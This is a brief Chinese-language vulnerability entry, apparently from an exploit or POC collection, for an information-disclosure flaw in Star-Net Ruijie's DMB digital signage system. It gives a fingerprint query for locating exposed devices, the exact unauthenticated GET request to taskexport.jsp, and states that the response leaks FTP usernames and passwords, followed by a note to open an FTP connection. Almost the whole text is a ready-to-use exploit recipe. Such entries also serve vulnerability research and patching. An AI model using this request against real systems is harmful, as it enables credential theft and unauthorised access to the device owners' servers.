# 星网锐捷DMB-BS-taskexport存在信息泄露漏洞

锐捷 ｜ 信息泄露 ｜ —
- **指纹**：`app="STAR_NET-数字标牌系统"`
- **请求**：`GET /dmb/out/taskexport.jsp?taskcode HTTP/1.1`
- **响应特征**：200 ftp用户名密码
ftp建立连接